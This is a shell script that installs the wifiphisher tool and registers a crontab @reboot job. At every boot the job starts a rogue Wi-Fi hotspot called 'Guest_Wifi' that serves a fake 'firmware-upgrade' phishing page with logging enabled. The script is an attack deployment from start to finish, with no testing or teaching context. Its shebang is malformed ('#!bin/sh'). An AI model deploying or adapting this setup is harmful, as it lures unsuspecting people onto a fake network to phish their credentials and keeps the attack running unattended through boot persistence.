#!bin/sh
echo lol
wait 3
cd 
#installation of all programms and dependencies
sudo apt-get update
sudo apt-get full-upgrade
sudo apt-get install pip
sudo apt-get install libnl-genl-3-dev
sudo apt-get install libssl-dev
sudo git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python3 setup.py install # Install any dependencies

#setting up autostart
cd 
echo '
#This file will be automaticly executed at boot-up.
#Add any command meant to be autorun at boot. (including bash files)

#automaticly starts a phishing service that acts as a fake wifi hotspot.
sudo wifiphisher -i wlan1 -e Guest_Wifi -p firmware-upgrade -nD --logging
' > autostart.sh

# Path to your script
script_dir=$(dirname "$(readlink -f "$0")")
script_path="$script_dir/autostart.sh"

# Add a line to crontab to run the script at boot
(crontab -l ; echo "@reboot $script_path") | crontab -